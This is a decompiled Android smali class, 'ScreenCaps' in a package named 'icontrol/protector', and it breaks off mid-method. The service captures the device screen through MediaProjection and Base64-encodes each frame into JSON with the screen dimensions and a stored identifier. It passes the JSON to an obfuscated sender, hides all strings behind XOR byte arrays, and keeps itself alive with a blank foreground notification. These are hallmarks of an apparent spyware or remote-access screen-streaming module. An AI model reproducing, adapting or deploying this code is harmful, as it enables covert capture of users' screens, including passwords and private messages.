.class public Lcom/icontrol/protector/ScreenCaps;
.super Landroid/app/Service;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/icontrol/protector/ScreenCaps$g;,
        Lcom/icontrol/protector/ScreenCaps$f;,
        Lcom/icontrol/protector/ScreenCaps$e;
    }
.end annotation


# static fields
.field private static final l:Ljava/lang/String;

.field private static final m:Ljava/lang/String;

.field private static final n:Ljava/lang/String;

.field private static final o:Ljava/lang/String;

.field private static final p:Ljava/lang/String;

.field private static final q:Ljava/lang/String;

.field private static final r:Ljava/lang/String;

.field private static final s:Ljava/lang/String;

.field public static t:Ljava/util/List;

.field public static u:Ljava/lang/Object;

.field public static v:Ljava/lang/Boolean;

.field public static w:Ljava/lang/String;

.field private static x:I

.field private static y:Landroid/content/Context;

.field private static final z:Ljava/util/concurrent/ExecutorService;


# instance fields
.field private b:Landroid/media/projection/MediaProjection;

.field private c:Landroid/media/ImageReader;

.field private d:Landroid/os/Handler;

.field private e:Landroid/view/Display;

.field private f:Landroid/hardware/display/VirtualDisplay;

.field private g:I

.field private h:I

.field private i:I

.field private j:I

.field private k:Lcom/icontrol/protector/ScreenCaps$g;


# direct methods
.method static constructor <clinit>()V
    .locals 5

    const/16 v0, 0xa

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/ScreenCaps;->l:Ljava/lang/String;

    const/16 v0, 0xb

    new-array v0, v0, [B

    fill-array-data v0, :array_2

    new-array v2, v1, [B

    fill-array-data v2, :array_3

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/ScreenCaps;->m:Ljava/lang/String;

    const/4 v0, 0x5

    new-array v2, v0, [B

    fill-array-data v2, :array_4

    new-array v3, v1, [B

    fill-array-data v3, :array_5

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    sput-object v2, Lcom/icontrol/protector/ScreenCaps;->n:Ljava/lang/String;

    const/4 v2, 0x4

    new-array v3, v2, [B

    fill-array-data v3, :array_6

    new-array v4, v1, [B

    fill-array-data v4, :array_7

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    sput-object v3, Lcom/icontrol/protector/ScreenCaps;->o:Ljava/lang/String;

    const/4 v3, 0x6

    new-array v3, v3, [B

    fill-array-data v3, :array_8

    new-array v4, v1, [B

    fill-array-data v4, :array_9

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    sput-object v3, Lcom/icontrol/protector/ScreenCaps;->p:Ljava/lang/String;

    new-array v0, v0, [B

    fill-array-data v0, :array_a

    new-array v3, v1, [B

    fill-array-data v3, :array_b

    invoke-static {v0, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/ScreenCaps;->q:Ljava/lang/String;

    new-array v0, v2, [B

    fill-array-data v0, :array_c

    new-array v2, v1, [B

    fill-array-data v2, :array_d

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/ScreenCaps;->r:Ljava/lang/String;

    const/16 v0, 0x9

    new-array v0, v0, [B

    fill-array-data v0, :array_e

    new-array v1, v1, [B

    fill-array-data v1, :array_f

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/ScreenCaps;->s:Ljava/lang/String;

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    sput-object v0, Lcom/icontrol/protector/ScreenCaps;->t:Ljava/util/List;

    new-instance v0, Ljava/lang/Object;

    invoke-direct {v0}, Ljava/lang/Object;-><init>()V

    sput-object v0, Lcom/icontrol/protector/ScreenCaps;->u:Ljava/lang/Object;

    sget-object v0, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    sput-object v0, Lcom/icontrol/protector/ScreenCaps;->v:Ljava/lang/Boolean;

    const/16 v0, 0x50

    sput v0, Lcom/icontrol/protector/ScreenCaps;->x:I

    const/4 v0, 0x2

    invoke-static {v0}, Ljava/util/concurrent/Executors;->newFixedThreadPool(I)Ljava/util/concurrent/ExecutorService;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/ScreenCaps;->z:Ljava/util/concurrent/ExecutorService;

    return-void

    nop

    :array_0
    .array-data 1
        -0x1ct
        0x1ft
        -0x7bt
        -0x55t
        -0x41t
        0x3at
        -0x3at
        0x2t
        -0x14t
        0x3ct
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x73t
        0x4ct
        -0x1at
        -0x27t
        -0x26t
        0x5ft
        -0x58t
        0x41t
    .end array-data

    :array_2
    .array-data 1
        -0x5ft
        -0x2ft
        0x75t
        0x2t
        0x10t
        0x12t
        0x6et
        -0x75t
        -0x44t
        -0x30t
        0x63t
    .end array-data

    :array_3
    .array-data 1
        -0xdt
        -0x6ct
        0x26t
        0x57t
        0x5ct
        0x46t
        0x31t
        -0x38t
    .end array-data

    :array_4
    .array-data 1
        -0x51t
        0x16t
        0x5t
        0x16t
        0x50t
    .end array-data

    nop

    :array_5
    .array-data 1
        -0x2t
        0x43t
        0x49t
        0x42t
        0x9t
        0xet
        -0x71t
        -0x50t
    .end array-data

    :array_6
    .array-data 1
        0x4ft
        0x42t
        0x2ct
        -0x60t
    .end array-data

    :array_7
    .array-data 1
        0xbt
        0x3t
        0x78t
        -0x1ft
        -0x67t
        0x1bt
        -0x16t
        -0x7bt
    .end array-data

    :array_8
    .array-data 1
        0x6t
        0x58t
        -0x34t
        0x3dt
        -0x26t
        -0x69t
    .end array-data

    nop

    :array_9
    .array-data 1
        0x47t
        0x1bt
        -0x68t
        0x74t
        -0x6bt
        -0x27t
        0x22t
        -0x29t
    .end array-data

    :array_a
    .array-data 1
        0x40t
        0x3ct
        -0x63t
        0x13t
        0x49t
    .end array-data

    nop

    :array_b
    .array-data 1
        0x13t
        0x68t
        -0x24t
        0x41t
        0x1dt
        0x16t
        0x4bt
        0x3et
    .end array-data

    :array_c
    .array-data 1
        0x7ct
        -0x70t
        -0x19t
        -0x5bt
    .end array-data

    :array_d
    .array-data 1
        0x2ft
        -0x3ct
        -0x58t
        -0xbt
        -0x6et
        0x55t
        -0x5bt
        -0x5ct
    .end array-data

    :array_e
    .array-data 1
        0x31t
        -0x7ct
        0x73t
        -0x62t
        0x29t
        0x4ft
        0x30t
        -0xet
        0x32t
    .end array-data

    nop

    :array_f
    .array-data 1
        0x42t
        -0x19t
        0x1t
        -0x5t
        0x4ct
        0x21t
        0x53t
        -0x6dt
    .end array-data
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method private A(Landroid/content/Context;)V
    .locals 1

    .line 1
    :try_start_0
    invoke-static {p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mv;->b(Landroid/content/Context;)Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mv;

    move-result-object v0

    invoke-virtual {v0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mv;->a(Landroid/content/Context;)Landroid/app/Notification;

    move-result-object p1

    if-nez p1, :cond_0

    new-instance p1, Landroid/app/Notification;

    invoke-direct {p1}, Landroid/app/Notification;-><init>()V

    :cond_0
    sget v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->k:I

    invoke-virtual {p0, v0, p1}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    sget p1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->k:I

    new-instance v0, Landroid/app/Notification;

    invoke-direct {v0}, Landroid/app/Notification;-><init>()V

    invoke-virtual {p0, p1, v0}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V

    :goto_0
    return-void
.end method

.method private B()V
    .locals 2

    .line 1
    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    sput-object v0, Lcom/icontrol/protector/ScreenCaps;->v:Ljava/lang/Boolean;

    invoke-static {v0}, Lcom/icontrol/protector/a;->d(Ljava/lang/Boolean;)V

    iget-object v0, p0, Lcom/icontrol/protector/ScreenCaps;->d:Landroid/os/Handler;

    if-eqz v0, :cond_0

    new-instance v1, Lcom/icontrol/protector/ScreenCaps$d;

    invoke-direct {v1, p0}, Lcom/icontrol/protector/ScreenCaps$d;-><init>(Lcom/icontrol/protector/ScreenCaps;)V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    :cond_0
    return-void
.end method

.method private a(Landroid/content/Context;[B)V
    .locals 6

    .line 1
    const/4 v0, 0x0

    :try_start_0
    invoke-static {p2, v0}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object p2

    const/4 v0, 0x2

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    new-array v2, v1, [B

    fill-array-data v2, :array_2

    new-array v3, v1, [B

    fill-array-data v3, :array_3

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {p1, v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    if-nez p1, :cond_0

    return-void

    :cond_0
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    const/4 v2, 0x3

    new-array v3, v2, [B

    fill-array-data v3, :array_4

    new-array v4, v1, [B

    fill-array-data v4, :array_5

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 p1, 0x5

    new-array p1, p1, [B

    fill-array-data p1, :array_6

    new-array v3, v1, [B

    fill-array-data v3, :array_7

    invoke-static {p1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    const/16 v3, 0xa

    new-array v4, v3, [B

    fill-array-data v4, :array_8

    new-array v5, v1, [B

    fill-array-data v5, :array_9

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, p1, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 p1, 0x4

    new-array v4, p1, [B

    fill-array-data v4, :array_a

    new-array v5, v1, [B

    fill-array-data v5, :array_b

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    new-array v3, v3, [B

    fill-array-data v3, :array_c

    new-array v5, v1, [B

    fill-array-data v5, :array_d

    invoke-static {v3, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v4, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v2, v2, [B

    fill-array-data v2, :array_e

    new-array v3, v1, [B

    fill-array-data v3, :array_f

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array p2, p1, [B

    fill-array-data p2, :array_10

    new-array v2, v1, [B

    fill-array-data v2, :array_11

    invoke-static {p2, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p2

    iget v2, p0, Lcom/icontrol/protector/ScreenCaps;->h:I

    invoke-virtual {v0, p2, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    new-array p1, p1, [B

    fill-array-data p1, :array_12

    new-array p2, v1, [B

    fill-array-data p2, :array_13

    invoke-static {p1, p2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    iget p2, p0, Lcom/icontrol/protector/ScreenCaps;->i:I

    invoke-virtual {v0, p1, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    invoke-virtual {v0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/y80;->d(Ljava/lang/String;)V
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_0
    return-void

    :array_0
    .array-data 1
        -0x60t
        0x77t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x17t
        0x33t
        0x74t
        0x14t
        -0xbt
        0x33t
        0x53t
        0x52t
    .end array-data

    :array_2
    .array-data 1
        0x41t
        -0x65t
        0x1bt
        0x48t
        -0x43t
        -0x65t
        0x52t
        0x66t
    .end array-data

    :array_3
    .array-data 1
        0x5t
        -0x2t
        0x6dt
        0x21t
        -0x22t
        -0x2t
        0x3bt
        0x2t
    .end array-data

    :array_4
    .array-data 1
        0x28t
        -0x4ft
        0x75t
    .end array-data

    :array_5
    .array-data 1
        0x58t
        -0x28t
        0x11t
        -0x48t
        -0x5ft
        0xat
        -0x14t
        -0x2t
    .end array-data

    :array_6
    .array-data 1
        0x3bt
        -0x29t
        0x71t
        -0x49t
        0x10t
    .end array-data

    nop

    :array_7
    .array-data 1
        0x52t
        -0x5dt
        0x8t
        -0x39t
        0x75t
        0x42t
        0x44t
        0x60t
    .end array-data

    :array_8
    .array-data 1
        0x11t
        -0x78t
        -0x49t
        -0x1t
        -0x11t
        0x2dt
        0x3at
        -0x66t
        0x2ct
        -0x70t
    .end array-data

    nop

    :array_9
    .array-data 1
        0x42t
        -0x1ct
        -0x3bt
        -0x60t
        -0x74t
        0x41t
        0x53t
        -0x1t
    .end array-data

    :array_a
    .array-data 1
        0x21t
        -0x2bt
        0x52t
        0x24t
    .end array-data

    :array_b
    .array-data 1
        0x52t
        -0x60t
        0x30t
        0x47t
        -0x5ft
        -0x2bt
        0x32t
        0x3ct
    .end array-data

    :array_c
    .array-data 1
        -0x41t
        0x4dt
        -0x6ct
        -0x4et
        -0x54t
        0x40t
        0x48t
        0x7ft
        -0x5dt
        0x5at
    .end array-data

    nop

    :array_d
    .array-data 1
        -0x34t
        0x2et
        -0x1at
        -0x29t
        -0x37t
        0x2et
        0x3bt
        0x17t
    .end array-data

    :array_e
    .array-data 1
        0x47t
        0x62t
        0x37t
    .end array-data

    :array_f
    .array-data 1
        0x2et
        0xft
        0x50t
        -0x7et
        0x2ct
        -0x62t
        -0x10t
        0x37t
    .end array-data

    :array_10
    .array-data 1
        -0x44t
        -0x22t
        0x60t
        -0x6t
    .end array-data

    :array_11
    .array-data 1
        -0x35t
        -0x4dt
        0xft
        -0x68t
        0x21t
        -0x7at
        -0x74t
        -0x36t
    .end array-data

    :array_12
    .array-data 1
        0x69t
        0x36t
        0x63t
        0x57t
    .end array-data

    :array_13
    .array-data 1
        0x1t
        0x5bt
        0xct
        0x35t
        -0x7ct
        0x59t
        -0x1at
        -0x5ct
    .end array-data
.end method

.method static synthetic c(Lcom/icontrol/protector/ScreenCaps;)Landroid/media/ImageReader;
    .locals 0

    .line 1
    iget-object p0, p0, Lcom/icontrol/protector/ScreenCaps;->c:Landroid/media/ImageReader;

    return-object p0
.end method

.method static synthetic d(Lcom/icontrol/protector/ScreenCaps;)I
    .locals 0

    .line 1
    iget p0, p0, Lcom/icontrol/protector/ScreenCaps;->h:I

    return p0
.end method

.method static synthetic e(Lcom/icontrol/protector/ScreenCaps;)Lcom/icontrol/protector/ScreenCaps$g;
    .locals 0

    .line 1
    iget-object p0, p0, Lcom/icontrol/protector/ScreenCaps;->k:Lcom/icontrol/protector/ScreenCaps$g;

    return-object p0
.end method

.method static synthetic f(Lcom/icontrol/protector/ScreenCaps;)Landroid/media/projection/MediaProjection;
    .locals 0

    .line 1
    iget-object p0, p0, Lcom/icontrol/protector/ScreenCaps;->b:Landroid/media/projection/MediaProjection;

    return-object p0
.end method

.method static synthetic g(Lcom/icontrol/protector/ScreenCaps;)Landroid/os/Handler;
    .locals 0

    .line 1
    iget-object p0, p0, Lcom/icontrol/protector/ScreenCaps;->d:Landroid/os/Handler;

    return-object p0
.end method

.method static synthetic h(Lcom/icontrol/protector/ScreenCaps;Landroid/os/Handler;)Landroid/os/Handler;
    .locals 0

    .line 1
    iput-object p1, p0, Lcom/icontrol/protector/ScreenCaps;->d:Landroid/os/Handler;

    return-object p1
.end method

.method static synthetic i(Lcom/icontrol/protector/ScreenCaps;)I
    .locals 0

    .line 1
    iget p0, p0, Lcom/icontrol/protector/ScreenCaps;->i:I

    return p0
.end method

.method static synthetic j()Landroid/content/Context;
    .locals 1

    .line 1
    sget-object v0, Lcom/icontrol/protector/ScreenCaps;->y:Landroid/content/Context;

    return-object v0
.end method

.method static synthetic k()I
    .locals 1

    .line 1
    sget v0, Lcom/icontrol/protector/ScreenCaps;->x:I

    return v0
.end method

.method static synthetic l(Lcom/icontrol/protector/ScreenCaps;Landroid/content/Context;[B)V
    .locals 0

    .line 1
    invoke-direct {p0, p1, p2}, Lcom/icontrol/protector/ScreenCaps;->a(Landroid/content/Context;[B)V

    return-void
.end method

.method static synthetic m(Lcom/icontrol/protector/ScreenCaps;)Landroid/view/Display;
    .locals 0

    .line 1
    iget-object p0, p0, Lcom/icontrol/protector/ScreenCaps;->e:Landroid/view/Display;

    return-object p0
.end method

.method static synthetic n(Lcom/icontrol/protector/ScreenCaps;)I
    .locals 0

    .line 1
    iget p0, p0, Lcom/icontrol/protector/ScreenCaps;->j:I

    return p0
.end method

.method static synthetic o(Lcom/icontrol/protector/ScreenCaps;I)I
    .locals 0

    .line 1
    iput p1, p0, Lcom/icontrol/protector/ScreenCaps;->j:I

    return p1
.end method

.method static synthetic p(Lcom/icontrol/protector/ScreenCaps;)Landroid/hardware/display/VirtualDisplay;
    .locals 0

    .line 1
    iget-object p0, p0, Lcom/icontrol/protector/ScreenCaps;->f:Landroid/hardware/display/VirtualDisplay;

    return-object p0
.end method

.method static synthetic q(Lcom/icontrol/protector/ScreenCaps;)V
    .locals 0

    .line 1
    invoke-direct {p0}, Lcom/icontrol/protector/ScreenCaps;->r()V

    return-void
.end method

.method private r()V
    .locals 10

    .line 1
    sget-object v0, Lcom/icontrol/protector/ScreenCaps;->y:Landroid/content/Context;

    const/4 v1, 0x4

    new-array v2, v1, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v4, v3, [B

    fill-array-data v4, :array_1

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    const/4 v4, 0x3

    new-array v4, v4, [B

    fill-array-data v4, :array_2

    new-array v5, v3, [B

    fill-array-data v5, :array_3

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-static {v0, v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I

    move-result v0

    iput v0, p0, Lcom/icontrol/protector/ScreenCaps;->h:I

    sget-object v0, Lcom/icontrol/protector/ScreenCaps;->y:Landroid/content/Context;

    new-array v2, v1, [B

    fill-array-data v2, :array_4

    new-array v4, v3, [B

    fill-array-data v4, :array_5

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    new-array v1, v1, [B

    fill-array-data v1, :array_6

    new-array v3, v3, [B

    fill-array-data v3, :array_7

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v2, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I

    move-result v0

    iput v0, p0, Lcom/icontrol/protector/ScreenCaps;->i:I

    iget v1, p0, Lcom/icontrol/protector/ScreenCaps;->h:I

    const/4 v2, 0x1

    const/4 v3, 0x6

    invoke-static {v1, v0, v2, v3}, Landroid/media/ImageReader;->newInstance(IIII)Landroid/media/ImageReader;

    move-result-object v0

    iput-object v0, p0, Lcom/icontrol/protector/ScreenCaps;->c:Landroid/media/ImageReader;

    iget-object v1, p0, Lcom/icontrol/protector/ScreenCaps;->b:Landroid/media/projection/MediaProjection;

    sget-object v2, Lcom/icontrol/protector/ScreenCaps;->s:Ljava/lang/String;

    iget v3, p0, Lcom/icontrol/protector/ScreenCaps;->h:I

    iget v4, p0, Lcom/icontrol/protector/ScreenCaps;->i:I

    iget v5, p0, Lcom/icontrol/protector/ScreenCaps;->g:I

    invoke-static {}, Lcom/icontrol/protector/ScreenCaps;->u()I

    move-result v6

    iget-object v0, p0, Lcom/icontrol/protector/ScreenCaps;->c:Landroid/media/ImageReader;

    invoke-virtual {v0}, Landroid/media/ImageReader;->getSurface()Landroid/view/Surface;

    move-result-object v7

    const/4 v8, 0x0

    iget-object v9, p0, Lcom/icontrol/protector/ScreenCaps;->d:Landroid/os/Handler;

    invoke-virtual/range {v1 .. v9}, Landroid/media/projection/MediaProjection;->createVirtualDisplay(Ljava/lang/String;IIIILandroid/view/Surface;Landroid/hardware/display/VirtualDisplay$Callback;Landroid/os/Handler;)Landroid/hardware/display/VirtualDisplay;

    move-result-object v0

    iput-object v0, p0, Lcom/icontrol/protector/ScreenCaps;->f:Landroid/hardware/display/VirtualDisplay;

    iget-object v0, p0, Lcom/icontrol/protector/ScreenCaps;->c:Landroid/media/ImageReader;

    new-instance v1, Lcom/icontrol/protector/ScreenCaps$e;

    const/4 v2, 0x0

    invoke-direct {v1, p0, v2}, Lcom/icontrol/protector/ScreenCaps$e;-><init>(Lcom/icontrol/protector/ScreenCaps;Lcom/icontrol/protector/ScreenCaps$a;)V

    iget-object v2, p0, Lcom/icontrol/protector/ScreenCaps;->d:Landroid/os/Handler;

    invoke-virtual {v0, v1, v2}, Landroid/media/ImageReader;->setOnImageAvailableListener(Landroid/media/ImageReader$OnImageAvailableListener;Landroid/os/Handler;)V

    return-void

    nop

    :array_0
    .array-data 1
        -0x66t
        0x12t
        -0x49t
        -0x13t
    .end array-data

    :array_1
    .array-data 1
        -0x33t
        0x61t
        -0x2ct
        -0x61t
        0x33t
        -0x1dt
        0x1ct
        0x5et
    .end array-data

    :array_2
    .array-data 1
        0x32t
        -0x3t
        -0x5et
    .end array-data

    :array_3
    .array-data 1
        0x5t
        -0x31t
        -0x6et
        -0x70t
        -0x7dt
        -0x13t
        -0x70t
        -0x1dt
    .end array-data

    :array_4
    .array-data 1
        0x1dt
        -0xdt
        -0x50t
        0x4ft
    .end array-data

    :array_5
    .array-data 1
        0x55t
        -0x80t
        -0x2dt
        0x3dt
        -0x20t
        0x40t
        0x4ct
        -0x18t
    .end array-data

    :array_6
    .array-data 1
        -0x59t
        0x56t
        0xbt
        0x33t
    .end array-data

    :array_7
    .array-data 1
        -0x6at
        0x64t
        0x33t
        0x3t
        -0x8t
        0x6at
        -0x61t
        -0x16t
    .end array-data
.end method

.method public static s(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/content/Intent;
    .locals 2

    .line 1
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/icontrol/protector/ScreenCaps;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    sget-object p0, Lcom/icontrol/protector/ScreenCaps;->p:Ljava/lang/String;

    sget-object v1, Lcom/icontrol/protector/ScreenCaps;->q:Ljava/lang/String;

